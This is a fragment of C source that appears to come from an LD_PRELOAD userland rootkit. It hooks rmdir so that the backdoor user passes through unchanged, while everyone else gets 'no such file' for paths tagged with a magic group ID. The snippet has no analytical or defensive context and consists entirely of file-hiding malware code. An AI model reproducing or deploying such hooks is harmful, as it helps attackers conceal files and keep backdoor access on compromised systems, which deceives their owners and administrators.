int rmdir(const char *pathname)
{
    HOOK(o_rmdir, CRMDIR);
    if(is_bdusr()) return o_rmdir(pathname);
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return -1; }
    return o_rmdir(pathname);
}
